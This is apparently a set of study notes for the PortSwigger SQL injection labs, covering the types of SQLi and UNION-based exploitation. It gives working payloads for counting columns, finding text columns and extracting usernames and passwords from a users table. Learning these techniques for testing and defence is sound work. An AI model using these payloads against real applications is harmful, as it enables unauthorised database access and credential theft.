# SQL Injection (SQLi) - PortSwigger Labs

## 📌 Introduction
SQL Injection (SQLi) is a vulnerability that allows attackers to manipulate an application's database queries. This can result in unauthorized access, data leaks, and even system compromise.

---

## 🏆 Types of SQL Injection
1. **In-Band SQL Injection**
   - **Union-based SQLi**: Uses `UNION` to retrieve additional data.
   - **Error-based SQLi**: Leverages database errors to extract information.
   
2. **Blind SQL Injection** (No direct feedback)
   - **Boolean-based SQLi**: Infers database responses based on true/false conditions.
   - **Time-based SQLi**: Uses delays to determine success.
   
3. **Out-of-band SQL Injection**
   - Extracts data through external channels like DNS or HTTP requests.

---

## 🔍 Exploiting SQL Injection with UNION
### **How UNION Attacks Work**
If a vulnerable application returns query results in responses, attackers can use `UNION` to retrieve additional data from the database.
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2;
```
**Conditions for a Successful UNION Attack:**
1. Both queries must have the **same number of columns**.
2. The data types of each column must be **compatible**.

---

### **Finding the Number of Columns**
Two main techniques can determine the correct number of columns:

#### **1️⃣ ORDER BY Method**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
An error occurs when the specified column index exceeds the actual column count.

#### **2️⃣ UNION SELECT NULL Method**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
If the number of `NULL` values is incorrect, an error occurs. When correct, an additional row is displayed.

**Note:** On Oracle databases, `DUAL` is required:
```sql
' UNION SELECT NULL FROM DUAL--
```

---

### **Identifying Columns That Accept Text**
To find which columns can store text data, test each column:
```sql
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
```
An error indicates an incompatible data type, while a successful attempt displays the string in the response.

---

### **Extracting Sensitive Data**
Once column count and data types are known, attackers can retrieve data:
```sql
' UNION SELECT username, password FROM users--
```

#### **Handling Single Column Output**
If only one column is returned, values can be concatenated:
```sql
' UNION SELECT username || '~' || password FROM users--  -- Oracle
' UNION SELECT CONCAT(username, ':', password) FROM users--  -- MySQL
```

## 🎯 References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)






